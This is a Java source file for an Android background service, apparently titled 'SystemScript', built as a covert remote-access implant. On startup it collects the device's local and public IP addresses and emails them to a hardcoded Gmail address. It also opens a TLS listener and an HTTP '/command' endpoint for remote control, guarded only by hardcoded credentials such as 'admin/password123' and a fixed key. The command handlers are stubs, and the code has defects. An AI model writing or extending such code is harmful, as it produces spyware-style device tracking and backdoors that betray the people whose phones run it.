package com.example.systemscript;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.security.KeyStore;
import java.util.Collections;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.mail.*;
import javax.mail.internet.*;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLServerSocket;
import javax.net.ssl.SSLServerSocketFactory;
import javax.net.ssl.SSLSocket;

import java.util.Properties;

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import org.json.JSONObject;

public class BackgroundService extends Service {

    private static final String CHANNEL_ID = "SystemScriptServiceChannel";
    private static final int SECURE_PORT = 8443; // Secure port for remote access
    private static final int HTTP_PORT = 8080; // Port for the HTTP server
    private static final String PRIVATE_KEY = "QWERTYUIOP"; // Shared private key for authentication
    private SSLServerSocket sslServerSocket;
    private HttpServer httpServer;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("SystemScript Service")
                .setContentText("Running in the background")
                .setSmallIcon(R.mipmap.ic_launcher)
                .build();
        startForeground(1, notification);

        // Fetch and share the IP address
        new Thread(this::shareDeviceIpAddress).start();

        // Start a thread for secure remote access
        new Thread(this::startSecureServer).start();

        // Start the HTTP server
        startHttpServer();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Ensures the service is restarted if killed
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (sslServerSocket != null && !sslServerSocket.isClosed()) {
                sslServerSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (httpServer != null) {
            httpServer.stop(0);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "SystemScript Background Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private void shareDeviceIpAddress() {
        try {
            String localIpAddress = getDeviceIpAddress();
            String publicIpAddress = getPublicIpAddress();
            String ipInfo = "Local IP: " + (localIpAddress != null ? localIpAddress : "Unavailable") +
                            "\nPublic IP: " + (publicIpAddress != null ? publicIpAddress : "Unavailable");
            sendEmail("rickybhaii2005@gmail.com", "Device IP Address", ipInfo);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error sharing IP address", e);
        }
    }

    private String getDeviceIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface networkInterface : interfaces) {
                List<InetAddress> addresses = Collections.list(networkInterface.getInetAddresses());
                for (InetAddress address : addresses) {
                    if (!address.isLoopbackAddress() && address.isSiteLocalAddress()) {
                        return address.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error fetching IP address", e);
        }
        return null;
    }

    private String getPublicIpAddress() {
        try {
            URL url = new URL("https://api.ipify.org"); // External service to fetch public IP
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String publicIp = reader.readLine();
            reader.close();
            return publicIp;
        } catch (Exception e) {
            Log.e("BackgroundService", "Error fetching public IP address", e);
        }
        return null;
    }

    private void sendEmail(String to, String subject, String body) {
        try {
            final String encryptedUsername = "encrypted_username_here"; // Replace with encrypted email
            final String encryptedPassword = "encrypted_password_here"; // Replace with encrypted password
            final String key = "1234567890123456"; // 16-byte encryption key (must be kept secure)

            String username = decrypt(encryptedUsername, key);
            String password = decrypt(encryptedPassword, key);

            Properties props = new Properties();
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.port", "587");

            Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(username, password);
                }
            });

            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
            message.setSubject(subject);
            message.setText(body);

            Transport.send(message);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error sending email", e);
        }
    }

    private String decrypt(String encryptedData, String key) throws Exception {
        SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        byte[] decodedData = Base64.decode(encryptedData, Base64.DEFAULT);
        return new String(cipher.doFinal(decodedData));
    }

    private void startSecureServer() {
        try {
            // Load the keystore containing the server certificate
            KeyStore keyStore = KeyStore.getInstance("PKCS12");
            try (InputStream keyStoreStream = getResources().openRawResource(R.raw.keystore)) {
                keyStore.load(keyStoreStream, "keystore_password".toCharArray());
            }

            // Initialize the KeyManagerFactory with the keystore
            KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
            keyManagerFactory.init(keyStore, "keystore_password".toCharArray());

            // Create an SSLServerSocketFactory
            SSLServerSocketFactory sslServerSocketFactory = (SSLServerSocketFactory) SSLServerSocketFactory.getDefault();

            // Create an SSLServerSocket
            sslServerSocket = (SSLServerSocket) sslServerSocketFactory.createServerSocket(SECURE_PORT);

            // Require client authentication
            sslServerSocket.setNeedClientAuth(true);

            while (!sslServerSocket.isClosed()) {
                SSLSocket clientSocket = (SSLSocket) sslServerSocket.accept();

                // Handle client authentication
                new Thread(() -> handleClient(clientSocket)).start();
            }
        } catch (Exception e) {
            Log.e("BackgroundService", "Error starting secure server", e);
        }
    }

    private void handleClient(SSLSocket clientSocket) {
        try (OutputStream outputStream = clientSocket.getOutputStream();
             PrintWriter writer = new PrintWriter(outputStream, true)) {

            // Basic authentication (username: admin, password: password123)
            writer.println("Enter username:");
            BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            String username = reader.readLine();

            writer.println("Enter password:");
            String password = reader.readLine();

            if ("admin".equals(username) && "password123".equals(password)) {
                writer.println("Authentication successful. Welcome!");
                // Handle further communication with the client
            } else {
                writer.println("Authentication failed. Disconnecting...");
                clientSocket.close();
            }
        } catch (IOException e) {
            Log.e("BackgroundService", "Error handling client", e);
        }
    }

    private void startHttpServer() {
        try {
            httpServer = HttpServer.create(new InetSocketAddress(HTTP_PORT), 0);
            httpServer.createContext("/command", new CommandHandler());
            httpServer.start();
            Log.d("BackgroundService", "HTTP server started on port " + HTTP_PORT);
        } catch (Exception e) {
            Log.e("BackgroundService", "Error starting HTTP server", e);
        }
    }

    private class CommandHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) {
            try {
                if ("POST".equals(exchange.getRequestMethod())) {
                    String requestBody = new String(exchange.getRequestBody().readAllBytes());
                    JSONObject json = new JSONObject(requestBody);

                    // Verify private key
                    if (!PRIVATE_KEY.equals(json.getString("privateKey"))) {
                        sendResponse(exchange, 403, "Invalid private key");
                        return;
                    }

                    // Log received details
                    Log.d("BackgroundService", "Received command: " + json.getString("command"));
                    Log.d("BackgroundService", "Public IP: " + json.getString("publicIp"));
                    Log.d("BackgroundService", "MAC Address: " + json.getString("macAddress"));
                    Log.d("BackgroundService", "Private IP: " + json.getString("privateIp"));

                    // Process the command
                    String command = json.getString("command");
                    if ("START_SERVICE".equals(command)) {
                        startService();
                    } else if ("STOP_SERVICE".equals(command)) {
                        stopService();
                    } else if ("RESTART_SERVICE".equals(command)) {
                        restartService();
                    }

                    sendResponse(exchange, 200, "Command executed: " + command);
                } else {
                    sendResponse(exchange, 405, "Method Not Allowed");
                }
            } catch (Exception e) {
                Log.e("BackgroundService", "Error handling command", e);
                sendResponse(exchange, 500, "Internal Server Error");
            }
        }

        private void sendResponse(HttpExchange exchange, int statusCode, String response) {
            try {
                exchange.sendResponseHeaders(statusCode, response.getBytes().length);
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response.getBytes());
                }
            } catch (Exception e) {
                Log.e("BackgroundService", "Error sending response", e);
            }
        }
    }

    private void startService() {
        Log.d("BackgroundService", "Service started.");
        // Add logic to start the service
    }

    private void stopService() {
        Log.d("BackgroundService", "Service stopped.");
        // Add logic to stop the service
    }

    private void restartService() {
        Log.d("BackgroundService", "Service restarted.");
        // Add logic to restart the service
    }
}
